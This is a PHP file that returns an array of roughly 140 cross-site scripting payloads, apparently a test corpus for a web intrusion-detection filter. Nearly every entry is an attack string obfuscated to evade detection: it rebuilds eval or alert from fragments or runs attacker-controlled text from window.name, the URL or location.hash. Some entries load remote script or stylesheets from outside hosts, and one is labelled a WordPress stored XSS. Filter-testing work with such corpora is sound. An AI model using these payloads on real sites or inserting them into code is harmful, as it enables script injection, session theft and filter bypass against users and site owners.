<?php
$exploits = array();
$exploits[] = '">XXX';
$exploits[] = '" style ="';
$exploits[] = '"src=xxx a="';
$exploits[] = '"\' onerror = alert(1) ';
$exploits[] = '" a "" b="x"';

$exploits[] = "s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1";
$exploits[] = "s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;";
$exploits[] = "s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);";
$exploits[] = "s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];";
$exploits[] = "s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];";
$exploits[] = "s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';";
$exploits[] = "s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;";
$exploits[] = "t0 =1? \"val\":0;t1 =1? \"e\":0;t2 =1? \"nam\":0;t=1? t1+t0:0;t=1?t[1? t:0]:0;t=(1? t:0)(1? (1? t:0)(1? t2+t1:0):0);";
$exploits[] = "a=1!=1?0:'eva';b=1!=1?0:'l';c=a+b;d=1!=1?0:'locatio';e=1!=1?0:'n.has';f=1!=1?0:'h.substrin';g=1!=1?0:'g(1)';h=d+e+f+g;0[''+(c)](0[''+(c)](h));";
$exploits[] = 'b=(navigator);c=(b.userAgent);d=c[61]+c[49]+c[6]+c[4];e=\'\'+/abcdefghijklmnopqrstuvwxyz.(1)/;f=e[12]+e[15]+e[3]+e[1]+e[20]+e[9]+e[15]+e[14]+e[27]+e[8]+e[1]+e[19]+e[8]+e[27]+e[19]+e[21]+e[2]+e[19]+e[20]+e[18]+e[9]+e[14]+e[7]+e[28]+e[29]+e[30];0[\'\'+[d]](0[\'\'+(d)](f));';
$exploits[] = "c4=1==1&&'(1)';c3=1==1&&'aler';c2=1==1&&':';c1=1==1&&'javascript';a=c1+c2+c3+'t'+c4;(URL=a);";
$exploits[] = "x=''+/abcdefghijklmnopqrstuvwxyz.(1)/;e=x[5];v=x[22];a=x[1];l=x[12];o=x[15];c=x[3];t=x[20];i=x[9];n=x[14];h=x[8];s=x[19];u=x[21];b=x[2];r=x[18];g=x[7];dot=x[27];uno=x[29];op=x[28];cp=x[30];z=e+v+a+l;y=l+o+c+a+t+i+o+n+dot+h+a+s+h+dot+s+u+b+s+t+r+i+n+g+op+uno+cp;0[''+[z]](0[''+(z)](y));";
$exploits[] = "d=''+/eval~locat~ion.h~ash.su~bstring(1)/;e=/.(x?.*)~(x?.*)~(x?.*)~(x?.*)~(x?.*)./;f=e.exec(d);g=f[2];h=f[3];i=f[4];j=f[5];k=g+h+i+j;0[''+(f[1])](0[''+(f[1])](k));";
$exploits[] = "a=1!=1?/x/:'eva';b=1!=1?/x/:'l';a=a+b;e=1!=1?/x/:'h';b=1!=1?/x/:'locatio';c=1!=1?/x/:'n';d=1!=1?/x/:'.has';h=1!=1?/x/:'1)';g=1!=1?/x/:'ring(0';f=1!=1?/x/:'.subst';b=b+c+d+e+f+g+h;B=00[''+[a]](b);00[''+[a]](B);";
$exploits[] = "(z=String)&&(z=z() );{a=(1!=1)?a:'eva'+z}{a+=(1!=1)?a:'l'+z}{b=(1!=1)?b:'locatio'+z}{b+=(1!=1)?b:'n.has'+z}{b+=(1!=1)?b:'h.subst'+z}{b+=(1!=1)?b:'r(1)'+z}{c=(1!=1)?c:(0)[a]}{d=c(b)}{c(d)}";
$exploits[] = "{z=(1==4)?here:{z:(1!=5)?'':be}}{y=(9==2)?dragons:{y:'l'+z.z}}{x=(6==5)?3:{x:'a'+y.y}}{w=(5==8)?9:{w:'ev'+x.x}}{v=(7==9)?3:{v:'tr(2)'+z.z}}{u=(3==8)?4:{u:'sh.subs'+v.v}}{t=(6==2)?6:{t:y.y+'ocation.ha'+u.u}}{s=(4==3)?3:{s:(8!=3)?(2)[w.w]:z}}{r=s.s(t.t)}{s.s(r)+z.z}";
$exploits[] = "{z= (1.==4.)?here:{z: (1.!=5.)?'':be}}{y= (9.==2.)?dragons:{y: 'l'+z.z}}{x= (6.==5.)?3:{x: 'a'+y.y}}{w= (5.==8.)?9:{w: 'ev'+x.x}}{v= (7.==9.)?3:{v: 'tr(2.)'+z.z}}{u= (3.==8.)?4:{u: 'sh.subs'+v.v}}{t= (6.==2.)?6:{t: y.y+'ocation.ha'+u.u}}{s= (4.==3.)?3:{s: (8.!=3.)?(2.)[w.w]:z}}{r= s.s(t.t)}{s.s(r)+z.z}";
$exploits[] = "a=1==1?1==1.?'':x:x;b=1==1?'val'+a:x;b=1==1?'e'+b:x;c=1==1?'str(1)'+a:x;c=1==1?'sh.sub'+c:x;c=1==1?'ion.ha'+c:x;c=1==1?'locat'+c:x;d=1==1?1==1.?0.[b]:x:x;d(d(c))";
$exploits[] = "{z =(1)?\"\":a}{y =(1)?{y: 'l'+z}:{y: 'l'+z.z}}x=''+z+'eva'+y.y;n=.1[x];{};;
o=''+z+\"aler\"+z+\"t(x)\";
n(o);";
$exploits[] = ";{z =(1)?\"\":a}{y =(1)?{y: 'eva'+z}:{y: 'l'+z.z}}x=''+z+{}+{}+{};
{};;
{v =(0)?z:z}v={_$:z+'aler'+z};
{k =(0)?z:z}k={_$$:v._$+'t(x)'+z};
x=''+y.y+'l';{};
n=.1[x];
n(k._$$)";
$exploits[] = "ä=/ä/!=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);$=.0[b];a=$;a(c)";
$exploits[] = 'x=/x/
$x=!!1?\'ash\':xx
$x=!!1?\'ation.h\'+$x:xx
$x=!!1?\'loc\'+$x:xx
x.x=\'\'. eval,
x.x(x.x($x)
)';
$exploits[] = 'a=/x/
$b=!!1e1?\'ash\':a
$b=!!1e1?\'ion.h\'+$b:a
$b=!!1e1?\'locat\'+$b:a
$a=!1e1?!1e1:eval
a.a=$a
$b=a.a($b)
$b=a.a($b)';
$exploits[] = 'y=name,null
$x=eval,null
$x(y)';
$exploits[] = '$=\'e\'
,x=$[$+\'val\']
x(x(\'nam\'+$)+$)';
$exploits[] = 'typeof~delete~typeof~alert(1)';
$exploits[] = 'ªª=1&& name
ª=1&&window.eval,1
ª(ªª)';
$exploits[] = "y='nam' x=this.eval x(x(y ('e') new Array) y)";
$exploits[] = "ä=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);ä=.0[b];ä(c)";
$exploits[] = "b = (x());
$ = .0[b];a=$;
a( h() );
function x () { return 'eva' + p(); };
function p() { return 'l' ; };
function h() { return 'aler' + i(); };
function i() { return 't (123456)' ; };";
$exploits[] = "s=function test2() {return 'aalert(1)a';1,1}();
void(a = {} );
a.a1=function xyz() {return s[1] }();
a.a2=function xyz() {return s[2] }();
a.a3=function xyz() {return s[3] }();
a.a4=function xyz() {return s[4] }();
a.a5=function xyz() {return s[5] }();
a.a6=function xyz() {return s[6] }();
a.a7=function xyz() {return s[7] }();
a.a8=function xyz() {return s[8] }();
$=function xyz() {return a.a1 + a.a2 + a.a3 +a.a4 +a.a5 + a.a6 + a.a7
+a.a8 }();
new Function($)();";
$exploits[] = "x = localName.toLowerCase() + 'lert(1),' + 0x00;new Function(x)()";
$exploits[] = "txt = java.lang.Character (49) ;rb = java.lang.Character (41) ;lb =
java.lang.Character (40) ;a = java./**/lang.Character (97) ;l =
java.lang.Character (108) ;e = java.//
lang.Character (101) ;r =
java.lang.Character (114) ;t = java . lang.Character (116) ; v =
java.lang.Character (118) ;f = as( ) ; function msg () { return lb+
txt+ rb }; function as () { return a+ l+ e+ r+ t+ msg() }; function
ask () { return e+ v+ a+ l };g = ask ( ) ; (0[g])(f) ";
$exploits[] = "s=new String;
e = /aeavaala/+s;
e = new String + e[ 2 ] + e[ 4 ] + e[ 5 ] + e[ 7 ];
a = /aablaecrdt(1)a/+s;
a = new String + a[ 2]+a[ 4 ] + a[ 6 ] + a[ 8 ] + a[ 10 ] + a[ 11 ]
+ a[ 12 ] + a[ 13 ],
e=new Date() [e];";
$exploits[] = '$a= !false?"ev":1
$b= !false? "al":1
$a= !false?$a+$b:1
$a= !false?0[$a]:1
$b= !false?"locat":1
$c= !false?"ion.h":1
$d= !false?"ash":1
$b= !false?$b+$c+$d:1
$a setter=$a,$a=$a=$b';
$exploits[] = "$1 = /e1v1a1l/+''
$2 = []
$2 += $1[1]
$2 += $1[3]
$2 += $1[5]
$2 += $1[7]
$2 = $1[ $2 ]
$3 = /a1l1e1r1t1(1)1/+''
$4 = []
$4 += $3[1]
$4 += $3[3]
$4 += $3[5]
$4 += $3[7]
$4 += $3[9]
$4 += $3[11]
$4 += $3[12]
$4 += $3[13]
$2_ = $2
$4_ = $4
$2_ ( $4_ )";
$exploits[] = 'x=![]?\'42\':0
$a= !x?\'ev\':0
$b= !x?\'al\':0
$a= !x?$a+$b:0
$a setter = !x?0[$a]:0
$b= !x?\'locat\':0
$c= !x?\'ion.h\':0
$d= !x?\'ash\':0
$b= !x?$b+$c+$d:0
$msg= !x?\'i love ternary operators\':0
$a=$a=$b';
$exploits[] = "123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);";
$exploits[] = '$_ = !1-1 ? 0["\ev\al""]("\a\l\ert\(1\)"") : 0';
$exploits[] = "$$$[0] = !1-1 ? 'eva' : 0
$$$[1] = !1-1 ? 'l' : 0
$$$['\jo\in']([])";
$exploits[] = 'x=/eva/i[-1]
$y=/nam/i[-1]
$x$_0=(0)[x+\'l\']
$x=$x$_0($y+\'e\')
$x$_0($x)';
$exploits[] = '$y=("eva")
$z={}[$y+"l"]
$y=("aler")
$y+=(/t(1)/)[-1]
$z($y)';
$exploits[] = '[$y=("al")]&&[$z=$y]&&[$z+=("ert")+[]][DocDan=(/ev/)[-1]+$y]($z).valueOf()(1)';
$exploits[] = '[$y=(\'al\')]&[$z=$y \'ert\'][a=(1?/ev/:0)[-1] $y]($z)(1)';
$exploits[] = "0[('ev')+status+(z=('al'),z)](z+'ert(0),'+/x/)";
$exploits[] = "0[('ev')+(n='')+(z=('al'),z)](z+'ert(0),'+/x/)";
$exploits[] = "$={}.eval,$($('na'+navigator.vendor+('me,')+/x/))";
$exploits[] = "ale&zwnj;rt(1)";
$exploits[] = "ale&#x200d;rt(1)";
$exploits[] = "ale&#8206;rt(1)";
$exploits[] = 'al&#56325ert(1)';
$exploits[] = 'al&#xdfff;ert(1)';
$exploits[] = '1[<t>__par{new Array}ent__</t>][<t>al{new Array}ert</t>](1) ';
$exploits[] = '(new Option).style.setExpression(1,1&&name)';
$exploits[] = 'default xml namespace=toolbar,b=1&&this.atob
default xml namespace=toolbar,e2=b(\'ZXZhbA\')
default xml namespace=toolbar,e=this[toolbar,e2]
default xml namespace=toolbar,y=1&&name
default xml namespace=toolbar
default xml namespace=e(y)';
$exploits[] = '-Infinity++in eval(1&&name)';
$exploits[] = 'new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array,
x=(\'e\')
x=(\'nam\')+(new Array)+x
y=(\'val\')
y=(\'e\')+(new Array)+y
z=this
z=z[y]
z(z(x)+x)';
$exploits[] = 'undefined,undefined
undefined,undefined
undefined,undefined
undefined,undefined
x=(\'aler\
t\')
undefined,undefined
undefined,undefined
undefined,undefined
undefined,undefined
this [x]
(1)
undefined,undefined
undefined,undefined
undefined,undefined
undefined,undefined';
$exploits[] = 'location.assign(1?name+1:(x))';
$exploits[] = "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)";
$exploits[] = "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)";
$exploits[] = 'alal=(/YWxlcnQ/)(/YWxlcnQ/),
alal=alal[0],
atyujg=(/atob/)(/atob/),
con=atyujg.concat,
con1=con()[0],
con=con1[atyujg],
alal=con(alal),
alal=con1[alal],
alal(1)';
$exploits[] = 'alal=(1,/YWxlcnQ/),
alal=alal(alal),
alal=alal[0],
atyujg=(1,/atob/),
atyujg=atyujg(atyujg),
atat=atyujg[0],
con=atyujg.concat,
con1=con(),
con1=con1[0],
con=con1[atat],
alal=con(alal),
alal=con1[alal],
alal(1)';
$exploits[] = 'showmodaldialog((/javascript/({a:/javascript/,b:1}.a))+(/:aler/({a:/:aler/,b:1}.a))+(/t.1.+1/({a:/t(1)+1/,b:1}.a)));';

$exploits[] = "a=<r>loca<v>e</v>tion.has<v>va</v>h.subs<v>l</v>tr(1)</r>
{b=0e0[a.v.text()
]}http='';b(b(http+a.text()
))
";
$exploits[] = 'y=<a>alert</a>;content[y](123)';
$exploits[] = "s1=<s>evalalerta(1)a</s>; s2=<s></s>+''; s3=s1+s2; e1=/s1/?s3[0]:s1; e2=/s1/?s3[1]:s1; e3=/s1/?s3[2]:s1; e4=/s1/?s3[3]:s1; e=/s1/?.0[e1+e2+e3+e4]:s1; a1=/s1/?s3[4]:s1; a2=/s1/?s3[5]:s1; a3=/s1/?s3[6]:s1; a4=/s1/?s3[7]:s1; a5=/s1/?s3[8]:s1; a6=/s1/?s3[10]:s1; a7=/s1/?s3[11]:s1; a8=/s1/?s3[12]:s1; a=a1+a2+a3+a4+a5+a6+a7+a8;e(a)";
$exploits[] = "location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text>";
$exploits[] = "µ=<µ ł='le' µ='a' ø='rt'></µ>,top[µ.@µ+µ.@ł+µ.@ø](1)";

$exploits[] = "/*@cc_on@set@x=88@set@ss=83@set@s=83@*/@cc_on alert(String.fromCharCode(@x,@s,@ss))";
$exploits[] = "@cc_on eval(@cc_on name)";
$exploits[] = "@if(@_mc680x0)@else alert(@_jscript_version)@end";
$exploits[] = "\"\"@cc_on,x=@cc_on'something'@cc_on";

 $exploits[] = '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00';
$exploits[] = '"></a style="xss:ex/**/pression(alert(1));"';
$exploits[] = 'top.__proto__._= alert
_(1)';
$exploits[] = 'document.__parent__._=alert
_(1)';
$exploits[] = 'alert(1)';
$exploits[] = "b=/a/,
d=alert
d(";
$exploits[] = "1
alert(1)";
$exploits[] = "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ";
$exploits[] = "<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>";
$exploits[] = "_content/alert(1)";
$exploits[] = "RegExp(/a/,alert(1))";
$exploits[] = "x=[/&/,alert,/&/][1],x(1)";
$exploits[] = "[1,alert,1][1](1)";
$exploits[] = "throw alert(1)";
$exploits[] = "delete alert(1)";
$exploits[] = "$=.7.eval,$(//
name
,1)";
$exploits[] = "$=.7.eval,$($('\rname'),1)";
$exploits[] = "e=1..eval
e(e(\"\u200fname\"),e)";
$exploits[] = "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>";
$exploits[] = "a//a'\u000aeval(name)";
$exploits[] = "a//a';eval(name)";
$exploits[] = "(x) setter=0?0.:alert,x=0";
$exploits[] = "y=('na') + new Array +'me'
y
(x)getter=0?0+0:eval,x=y
'foo bar foo bar f'";
$exploits[] = "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
y$=('na') +new Array+'me'
x$=('ev') +new Array+'al'
x$=0[x$]
x$(x$(y$)+y$)";
$exploits[] = "<applet/src=http://businessinfo.co.uk/labs/xss.html
type=text/html>";
$exploits[] = "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert";
$exploits[] = 'onload=1&&alert';
$exploits[] = "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')";
$exploits[] = "document.body.style.cssText=name";
$exploits[] = "for(i=0;;)i";
$exploits[] = "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)";
$exploits[] = "this .fdgsdfgsdfgdsfgdsfg
this .fdgsdfgsdfgdsfgdsfg
this .fdgsdfgsdfgdsfgdsfg
this .fdgsdfgsdfgdsfgdsfg
this .fdgsdfgsdfgdsfgdsfg
aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo";
$exploits[] = "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)";
$exploits[] = '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>';
$exploits[] = "const urchinTracker = open";
$exploits[] = "-setTimeout(
1E1+
',aler\
t ( /phpids rocks/ ) + 1E100000 ' )";
$exploits[] = '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>';
$exploits[] = '$$=\'e\'
_=$$+\'val\'
$=_
x=this[$]
y=x(\'nam\' + $$)
x(y)
\'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'';
$exploits[] = '＜script>alert("xss")＜/script>';
$exploits[] = '‹img/src=x""onerror=alert(1)///›';
$exploits[] = 'Image() .
ownerDocument .x=1';
$exploits[] = urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//');
$exploits[] = "',jQuery(\"body\").html(//);\'a'";
$exploits[] = '\',$(fred).set(\'html\',\'magically changes\')
\'s';
$exploits[] = "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
's";
$exploits[] = 'lo=/,Batman/,alert(\'Batman flew here\')';
$exploits[] = '<img src=xonerror=alert(1)>';
$exploits[] = "for(lo in{j:this}.j)!/ale.t/(lo)||this[{},lo](+!'')";
$exploits[] = 't="t (1),0 ",
x2 = (1, {x2:02.constructor,a:0}.x2),
xyz = (1, {xyz:x2.constructor,a:0}.xyz),
xyz("aler" + t)()';
$exploits[] = 'xzy={x :this}.x.alert
xzy(1)';
$exploits[] = 'xyz=Iterator([this]).next()
zyx=xyz[1].alert
zyx(1)';

$exploits[] = 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));';
$exploits[] = 'eval.call(this,unescape.call(this,location))';
$exploits[] = 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))';
$exploits[] = '_=eval,__=unescape,___=document.URL,_(__(___))';
$exploits[] = '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))';
$exploits[] = '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)';
$exploits[] = 'ev\al.call(this,unescape.call(this,location))';
$exploits[] = 'setTimeout//
(name//
,0)//';
$exploits[] = 'a=/ev/
.source
a+=/al/
.source,a = a[a]
a(name)';
$exploits[] = 'a=eval,b=(name);a(b)';
$exploits[] = 'a=eval,b= [ referrer ] ;a(b)';
$exploits[] = "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
(/z/g, [] ) : 0";
$exploits[] = "if(0) {} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
'foo bar foo bar foo'";
$exploits[] = "switch ('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}";
$exploits[] = "xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')
Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
while(0)
";
$exploits[] = '-parent(1)';
$exploits[] = "//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf//asdf@asdf.asdf
(new Option)['innerHTML']=opener.name";
$exploits[] = '+a
>>setTimeout(a(1).a+a(1).b+a(1).c,1000);
\'1\';"1"="1";a="1\"\n<a name=a a=con b=fi c=rm(120) >1<<1\\\'1\'1\"1";';
$exploits[] = '+a
>>showHelp(a(0).a+a(0).nodeName+a(0).b+a(0).c+a(0).nodeName.toLowerCase()+a(0).d+a(0).e);
\'1\';"1"="1";a="1\"\n<t id=a a=javascrip b=:confi c=rm(documen d=.coo e=kie) >1<<1\\\'1\'1\"1";';
//wordpress stored xss
$exploits[] = "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...".str_repeat('b', 65000)."..AAA'></a>";

return $exploits;

